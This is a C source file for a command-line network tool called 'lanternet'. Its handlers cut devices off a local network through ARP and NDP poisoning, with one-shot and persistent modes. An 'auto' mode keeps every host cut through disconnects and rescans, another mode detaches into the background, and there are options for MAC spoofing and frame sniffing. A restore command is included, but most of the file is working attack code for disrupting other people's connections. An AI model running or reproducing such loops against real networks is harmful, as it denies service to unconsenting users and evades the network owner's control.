/* commands.c - the command line: help, setup levels, handlers, long-running loops */
#include "lanternet.h"

/* how much setup a command needs before it runs */
#define NET_NONE 0      /* no socket: works without root */
#define NET_RAW  1      /* raw socket + banner */
#define NET_SCAN 2      /* plus the host list and the gateway MAC */

void cli_usage(void){
    printf("lanternet %s - LAN trust-failure toolkit\n", LANTERNET_VERSION);
    printf("  scan                     discover hosts (ARP + names + OS + IPv6)\n");
    printf("  listen [secs]            watch for names only, no cuts (default 120s)\n");
    printf("  who <ip>                 resolve one host\n");
    printf("  name [<ip> <label>]      set or list saved device names\n");
    printf("  cut <ip>                 cut a host\n");
    printf("  resume <ip>              restore a host\n");
    printf("  hold <ip> [bg]           keep one host cut\n");
    printf("  holdall [bg]             keep every host cut (scan once)\n");
    printf("  auto [bg]                cut everything, survive disconnects, rescan\n");
    printf("  daemon [bg]              holdall with a 30s rescan\n");
    printf("  cutall                   one-shot burst on every host\n");
    printf("  test <ip>                cut, watch, resume\n");
    printf("  restore                  stop everything and repair ARP/NDP state\n");
    printf("  stop | stopall           stop background runs\n");
    printf("  sniffmac <mac> [s]       watch frames from a MAC\n");
    printf("  sniffarp [s]             dump visible ARP frames\n");
    printf("  flags: --v4 --v6 --all --dry --gw <ip> --fake-mac [aa:bb:..] --json\n");
    printf("         --guard <pid>  (exit if that process dies; for app use)\n");
    printf("  flags may appear before or after the command; root is required\n");
}

/* shared setup */

static void banner(void){
    char a[32],b[32]; struct in_addr x;
    x.s_addr=g_myip; inet_ntop(AF_INET,&x,a,sizeof a);
    x.s_addr=g_gwip; inet_ntop(AF_INET,&x,b,sizeof b);
    if(g_json) fprintf(stderr,"lanternet: iface=%s myip=%s gw=%s\n",g_ifname,a,b);
    else       printf("lanternet: iface=%s myip=%s gw=%s\n",g_ifname,a,b);
}

/* scan + gateway MAC + router link-local; returns 0 on success */
static int prepare(void){
    scan();
    load_gwmac();
    if(g_do_v6){
        g_v6_ok = router_ll_from_route(g_router_ll);
        if(!g_json){
            if(g_v6_ok) printf("v6: router link-local %s (NDP cut ON)\n","fe80::..");
            else        printf("v6: no IPv6 default route; NDP cut OFF\n");
        }
    }
    if(!(g_gwmac[0]||g_gwmac[1])){ fprintf(stderr,"no gateway MAC found\n"); return -1; }
    return 0;
}

static void mark_all_cut(void){
    for(int i=0;i<g_nhost;i++) if(g_hosts[i].ip!=g_gwip) g_hosts[i].cut=1;
}

#ifdef LANTERNET_APP
/* The app build never detaches: a process the app cannot see and cannot kill
   is exactly the failure we are trying to avoid. The loops below run in the
   foreground instead, guarded by --guard <pid> and by SIGTERM/SIGINT. */
static void daemonize(const char *what){
    (void)what;
    fprintf(stderr,"background mode is not available in this build\n");
    exit(1);
}
#else
static void daemonize(const char *what){
    pid_t p=fork();
    if(p<0){ perror("fork"); exit(1); }
    if(p>0){ printf("%s running in background (pid %d); stop with: restore / stop\n", what, (int)p); exit(0); }
    setsid();
    int dn=open("/dev/null",O_RDWR);
    if(dn>=0){ dup2(dn,0); dup2(dn,1); dup2(dn,2); if(dn>2) close(dn); }
    FILE *pf=fopen(PID_FILE,"w");
    if(pf){ fprintf(pf,"%d\n",(int)getpid()); fclose(pf); }
}
#endif

/* keep every known host cut, refreshing at the poison cadence */
static void loop_all(int rescan_secs){
    signal(SIGPIPE,SIG_IGN);
    mark_all_cut();
    time_t last=time(NULL);
    for(;;){
#ifdef LANTERNET_APP
        app_guard_check();
#endif
        state_save();          /* record before poisoning: the guard can then
                                  never see a cut host the state file misses */
        for(int i=0;i<g_nhost;i++) if(g_hosts[i].cut) poison(&g_hosts[i],1);
        self_keepalive();
        if(rescan_secs>0 && (time(NULL)-last)>=rescan_secs){
            rescan_hosts(); mark_all_cut(); last=time(NULL);
        }
        usleep(TICK_US);
    }
}

/* cut everything, re-detect on link loss, rescan periodically */
static void loop_auto(void){
    signal(SIGPIPE,SIG_IGN);
    int linked=0; time_t last=0;
    for(;;){
#ifdef LANTERNET_APP
        app_guard_check();
#endif
        if(g_sock<0 || !have_link()){
            if(linked) printf("network down, waiting to reconnect...\n");
            linked=0; sleep(2);
            if(setup_network()!=0) continue;
        }
        if(!linked){
            linked=1; rescan_hosts(); mark_all_cut(); last=time(NULL);
            printf("cutting %d hosts on %s%s\n", g_nhost, g_ifname,
                (g_do_v6&&g_v6_ok)?" [v4+v6]":(g_do_v4?" [v4]":" [v6]"));
            fflush(stdout);
        } else if(g_nhost==0 || (time(NULL)-last)>=20){
            rescan_hosts(); mark_all_cut(); last=time(NULL);
        }
        state_save();          /* see the note in loop_all */
        for(int i=0;i<g_nhost;i++) if(g_hosts[i].cut) poison(&g_hosts[i],1);
        self_keepalive();
        usleep(TICK_US);
    }
}

/* frame sniffing (diagnostics) */

static int open_sniff(void){
    int s=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
    if(s<0){ perror("sniff socket"); return -1; }
    struct sockaddr_ll sll; memset(&sll,0,sizeof sll);
    sll.sll_family=AF_PACKET; sll.sll_protocol=htons(ETH_P_ALL); sll.sll_ifindex=g_ifidx;
    bind(s,(struct sockaddr*)&sll,sizeof sll);
    return s;
}

/* one frame, or -1 after a second of silence */
static int recv_frame(int s,unsigned char *b,int cap){
    struct timeval tv; tv.tv_sec=0; tv.tv_usec=1000000;
    fd_set fds; FD_ZERO(&fds); FD_SET(s,&fds);
    if(select(s+1,&fds,NULL,NULL,&tv)<=0) return -1;
    return recv(s,b,cap,0);
}

static void sniff_mac(const char *macs,unsigned char *want,int secs){
    int s=open_sniff();
    if(s<0) return;
    printf("watching frames from %s for %ds...\n", macs, secs);
    int cnt=0;
    for(int t=0;t<secs;t++){
        unsigned char b[2048]; int n;
        while((n=recv_frame(s,b,sizeof b))>=0){
            if(n<14 || memcmp(b+6,want,6)) continue;
            cnt++;
            unsigned short et=(b[12]<<8)|b[13];
            printf("  frame dst=%02x:%02x:%02x:%02x:%02x:%02x type=%04x len=%d\n",
                b[0],b[1],b[2],b[3],b[4],b[5],et,n);
        }
    }
    printf("total frames from %s: %d\n", macs, cnt);
    close(s);
}

static void sniff_arp(int secs){
    int s=open_sniff();
    if(s<0) return;
    printf("sniffing ARP for %ds...\n", secs);
    for(int t=0;t<secs;t++){
        unsigned char b[2048]; int n;
        while((n=recv_frame(s,b,sizeof b))>=0){
            if(n<42 || b[12]!=0x08 || b[13]!=0x06) continue;
            const struct arp_hdr *a=(const struct arp_hdr*)(b+14);
            unsigned short op=ntohs(a->op); if(op>2) continue;
            char sIP[32],tIP[32]; struct in_addr x;
            x.s_addr=a->spa; inet_ntop(AF_INET,&x,sIP,sizeof sIP);
            x.s_addr=a->tpa; inet_ntop(AF_INET,&x,tIP,sizeof tIP);
            printf("ARP %s ethdst=%02x:%02x:%02x:%02x:%02x:%02x who=%s(%02x:%02x:%02x:%02x:%02x:%02x) tell=%s(%02x:%02x:%02x:%02x:%02x:%02x)\n",
                op==1?"req":"rep", b[0],b[1],b[2],b[3],b[4],b[5],
                tIP,a->tha[0],a->tha[1],a->tha[2],a->tha[3],a->tha[4],a->tha[5],
                sIP,a->sha[0],a->sha[1],a->sha[2],a->sha[3],a->sha[4],a->sha[5]);
        }
    }
    close(s);
}

/* handlers: int fn(int narg, const char *arg[]) */

static int need_ip(int n,const char *a[]){
    (void)a;
    if(n<1){ fprintf(stderr,"need ip\n"); return 1; }
    return 0;
}

static int cmd_scan(int n,const char *a[]){ (void)n; (void)a; scan(); return 0; }

static int cmd_listen(int n,const char *a[]){ listen_names(n>0?atoi(a[0]):120); return 0; }

static int cmd_who(int n,const char *a[]){
    if(n<1){ fprintf(stderr,"need ip\n"); return 1; }
    unsigned int ip; inet_pton(AF_INET,a[0],&ip);
    unsigned char mac[6];
    if(!resolve_ip(ip,mac)){ printf("%s: no ARP reply\n",a[0]); return 1; }
    int hi=find_host(ip);
    if(hi<0){ char ms[20]; mac_str(mac,ms); printf("%s is at %s\n",a[0],ms); return 0; }
    const char *v=vendor_of(g_hosts[hi].mac);
    if(v) snprintf(g_hosts[hi].vendor,sizeof g_hosts[hi].vendor,"%s",v);
    char saved[64];
    if(name_lookup(g_hosts[hi].mac,saved,sizeof saved)){
        snprintf(g_hosts[hi].name,sizeof g_hosts[hi].name,"%s",saved);
        g_hosts[hi].name_src=SRC_USER;
    }
    g_nhost=hi+1;
    print_hosts();
    return 0;
}

static int cmd_name(int n,const char *a[]){
    if(n<1){                                   /* no args: list what is saved */
        FILE *f=fopen(NAMES_FILE,"r");
        if(!f){ printf("no saved names (%s)\n",NAMES_FILE); return 0; }
        char line[256]; while(fgets(line,sizeof line,f)) fputs(line,stdout);
        fclose(f);
        return 0;
    }
    unsigned int ip; inet_pton(AF_INET,a[0],&ip);
    unsigned char mac[6];
    if(!resolve_ip(ip,mac)){ fprintf(stderr,"%s not answering ARP\n",a[0]); return 1; }
    name_set(mac, n>1?a[1]:"");
    printf("named %s -> %s\n", a[0], (n>1&&a[1][0])?a[1]:"(cleared)");
    return 0;
}

static int cmd_restore(int n,const char *a[]){ (void)n; (void)a; restore_run(); return 0; }

static int cmd_sniffmac(int n,const char *a[]){
    if(n<1){ fprintf(stderr,"need mac\n"); return 1; }
    unsigned char want[6];
    if(!parse_mac(a[0],want)){ fprintf(stderr,"bad mac\n"); return 1; }
    sniff_mac(a[0],want, n>1?atoi(a[1]):12);
    return 0;
}

static int cmd_sniffarp(int n,const char *a[]){ sniff_arp(n>0?atoi(a[0]):12); return 0; }

/* TERM first so a running poison loop can repair, KILL only as a fallback */
static void term_then_kill(int pid){
    if(pid<=0 || pid==(int)getpid()) return;
    if(kill(pid,SIGTERM)!=0) return;
#ifdef LANTERNET_APP
    for(int i=0;i<15;i++){ if(kill(pid,0)!=0) return; usleep(100000); }
#endif
    usleep(300000);
    kill(pid,SIGKILL);
}

static int cmd_stop(int n,const char *a[]){
    (void)n; (void)a;
    int p=read_pidfile();
    if(p<=0){ printf("nothing to stop\n"); return 0; }
    term_then_kill(p);
    remove(PID_FILE);
    printf("stopped background run (pid %d)\n", p);
    return 0;
}

static int cmd_stopall(int n,const char *a[]){
    (void)n; (void)a;
    DIR *d=opendir("/proc"); int killed=0;
    if(d){
        struct dirent *e;
        while((e=readdir(d))){
            int pid=atoi(e->d_name);
            if(pid<=0 || pid==(int)getpid()) continue;
            char p[64]; snprintf(p,sizeof p,"/proc/%d/comm",pid);
            FILE *f=fopen(p,"r"); if(!f) continue;
            char nm[32]; nm[0]=0;
            if(fgets(nm,sizeof nm,f)){
                nm[strcspn(nm,"\n")]=0;
                if(!strcmp(nm,"lanternet")||!strcmp(nm,"nclite")||!strcmp(nm,"lanternet-app")){ term_then_kill(pid); killed++; }
            }
            fclose(f);
        }
        closedir(d);
    }
    remove(PID_FILE);
    printf("stopped %d process(es)\n", killed);
    return 0;
}

/* cut/resume/test differ only in what they do to one host */
enum { CUT_OFF, CUT_ON, CUT_TEST };

static int cut_one(const char *ips,int mode){
    unsigned int ip; inet_pton(AF_INET,ips,&ip);
    unsigned char mac[6];
    if(!resolve_ip(ip,mac)){ fprintf(stderr,"host %s not answering ARP\n",ips); return 1; }
    int idx=find_host(ip);
    if(idx<0){ fprintf(stderr,"host %s not in the table\n",ips); return 1; }
    if(mode==CUT_TEST){
        for(int i=0;i<6;i++){ poison(&g_hosts[idx],1); usleep(100000); }
        sleep(3);
        for(int i=0;i<6;i++){ poison(&g_hosts[idx],0); usleep(100000); }
        printf("tested %s (cut 3s, then restored)\n", ips);
        return 0;
    }
    int cut=(mode==CUT_ON);
    for(int i=0;i<4;i++){ poison(&g_hosts[idx],cut); self_keepalive(); usleep(TICK_US); }
    if(!cut) fix_host(ip,g_hosts[idx].mac);   /* unicast + broadcast + NDP repair */
    g_hosts[idx].cut=cut;
    state_save();
    printf("%s %s\n", cut?"cut":"resumed", ips);
    return 0;
}

static int cmd_cut(int n,const char *a[]){    return need_ip(n,a)?1:cut_one(a[0],CUT_ON);   }
static int cmd_resume(int n,const char *a[]){ return need_ip(n,a)?1:cut_one(a[0],CUT_OFF);  }
static int cmd_test(int n,const char *a[]){   return need_ip(n,a)?1:cut_one(a[0],CUT_TEST); }

static int cmd_cutall(int n,const char *a[]){
    (void)n; (void)a;
    for(int r=0;r<4;r++){
        for(int i=0;i<g_nhost;i++) if(g_hosts[i].ip!=g_gwip) poison(&g_hosts[i],1);
        self_keepalive(); usleep(TICK_US);
    }
    printf("cut %d hosts (use holdall to keep it)\n", g_nhost);
    return 0;
}

static int cmd_hold(int n,const char *a[]){
    if(need_ip(n,a)) return 1;
    unsigned int ip; inet_pton(AF_INET,a[0],&ip);
    unsigned char mac[6];
    if(!resolve_ip(ip,mac)){ fprintf(stderr,"host %s not answering ARP\n",a[0]); return 1; }
    int idx=find_host(ip);
    if(idx<0){ fprintf(stderr,"host %s not in the table\n",a[0]); return 1; }
    signal(SIGPIPE,SIG_IGN);
    if(n>1 && !strcmp(a[1],"bg")) daemonize("hold");
    else printf("holding cut on %s (Ctrl-C to stop)\n", a[0]);
    g_hosts[idx].cut=1;
    for(;;){
#ifdef LANTERNET_APP
        app_guard_check();
#endif
        state_save();          /* see the note in loop_all */
        poison(&g_hosts[idx],1);
        self_keepalive();
        usleep(TICK_US);
    }
}

static int run_holdall(const char *name,int rescan,int n,const char *a[]){
    if(n>0 && !strcmp(a[0],"bg")) daemonize(name);
    else printf("%s: cutting %d hosts%s (Ctrl-C to stop)\n", name, g_nhost, rescan?" (rescan 30s)":"");
    loop_all(rescan);
    return 0;
}

static int cmd_holdall(int n,const char *a[]){ return run_holdall("holdall",0,n,a); }
static int cmd_daemon(int n,const char *a[]){  return run_holdall("daemon",30,n,a); }

static int cmd_auto(int n,const char *a[]){
    if(n>0 && !strcmp(a[0],"bg")) daemonize("auto");
    else printf("auto: cut everything, re-arm after disconnects (Ctrl-C to stop)\n");
    loop_auto();
    return 0;
}

/* dispatch */

struct command {
    const char *name;
    int         level;
    int       (*fn)(int narg,const char *arg[]);
};

static const struct command COMMANDS[]={
    {"scan",     NET_RAW,  cmd_scan},
    {"listen",   NET_RAW,  cmd_listen},
    {"who",      NET_RAW,  cmd_who},
    {"name",     NET_RAW,  cmd_name},
    {"restore",  NET_RAW,  cmd_restore},
    {"sniffmac", NET_RAW,  cmd_sniffmac},
    {"sniffarp", NET_RAW,  cmd_sniffarp},
    {"cut",      NET_SCAN, cmd_cut},
    {"resume",   NET_SCAN, cmd_resume},
    {"test",     NET_SCAN, cmd_test},
    {"cutall",   NET_SCAN, cmd_cutall},
    {"hold",     NET_SCAN, cmd_hold},
    {"holdall",  NET_SCAN, cmd_holdall},
    {"daemon",   NET_SCAN, cmd_daemon},
    {"auto",     NET_SCAN, cmd_auto},
    {"stop",     NET_NONE, cmd_stop},
    {"stopall",  NET_NONE, cmd_stopall},
};

static const struct command *find_command(const char *name){
    for(unsigned i=0;i<sizeof COMMANDS/sizeof COMMANDS[0];i++)
        if(!strcmp(COMMANDS[i].name,name)) return &COMMANDS[i];
    return NULL;
}

int cli_run(const char *cmd,int narg,const char *arg[]){
    const struct command *c = cmd ? find_command(cmd) : NULL;
    if(!c){
        fprintf(stderr,"unknown command: %s\n", cmd?cmd:"(none)");
        cli_usage();
        return 1;
    }
    if(c->level>=NET_RAW){
        if(setup_network()!=0){ fprintf(stderr,"cannot open raw socket (root required)\n"); return 1; }
        banner();
        if(g_use_fake){
            char ms[20]; mac_str(g_fake_mac,ms);
            printf("spoof MAC: %s\n", ms);
        }
    }
    if(c->level>=NET_SCAN && prepare()!=0) return 1;
    return c->fn(narg,arg);
}
